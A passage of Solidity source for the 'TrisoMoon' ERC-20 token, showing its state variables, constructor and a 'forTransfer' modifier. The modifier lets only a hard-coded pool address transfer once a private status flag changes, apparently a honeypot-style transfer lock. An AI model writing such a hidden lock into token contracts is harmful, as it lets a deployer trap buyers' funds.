...
contract TrisoMoonToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenTM_totalSupply;
    uint256 private _tokenTM_status = 0;
    uint256 public stakingPoolTMStatus = 0;

    string private _tokenTM_name;
    string private _tokenTM_symbol;

    address private _poolTMAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenTM_name = "TrisoMoon";
        _tokenTM_symbol = "TrisoMoon";
        _tokenTM_totalSupply = 94500 * 10 ** 18;
        _balances[msg.sender] = _tokenTM_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolTMAddress || _tokenTM_status == 0);
        _;
    }
